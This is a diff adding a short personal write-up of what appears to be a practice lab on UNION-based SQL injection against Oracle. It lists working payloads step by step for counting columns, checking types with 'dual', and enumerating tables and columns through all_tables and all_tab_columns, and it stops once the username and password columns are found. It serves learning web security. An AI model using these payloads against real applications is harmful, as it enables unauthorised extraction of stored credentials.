@@ -1,0 +1,41 @@
+lab -10 Script: SQL injection attack, listing the database contents on Oracle
+
+End Goal:
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns in that table
+- Output the contents of the table
+- Login as the administrator user
+
+Analysis:
+
+1. Determine the number of columns
+' Order by 3-- error  
+So 2 columns
+------------------------------
+2. Find the type of the columns
+' UNION SELECT 'a', 'A' from dual-- works
+so both are string type
+------------------------------
+3. Version of the database
+try with all the oracle version queries 
+Oracle	SELECT * FROM v$version
+------------------------------
+4. Output the list of tables
+SELECT * FROM all_tables
+
+' UNION SELECT TABLE_NAME, NULL from all_tables-- works
+ Table Name: USERS_UHYKUV
+
+Google Oracle ALL_Tables
+Column	Description
+OWNER	The schema owner (user) of the table.
+TABLE_NAME	The name of the table.
+TABLESPACE_NAME	The name of the tablespace where the table data is stored.
+STATUS	The table's status (e.g., VALID or INVALID if related objects were dropped).
+LAST_ANALYZED	The date when the table was last analyzed for statistics.
+NUM_ROWS	The number of rows in the table (based on the last statistics gathering). Note: This value is often an estimate and may not be perfectly accurate in real-time.
+-------------------------------
+5. List all the columns in the USERS_UHYKUV table
+' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = 'USERS_UHYKUV'--
+PASSWORD_ZVMFQR
+USERNAME_OBEUAV
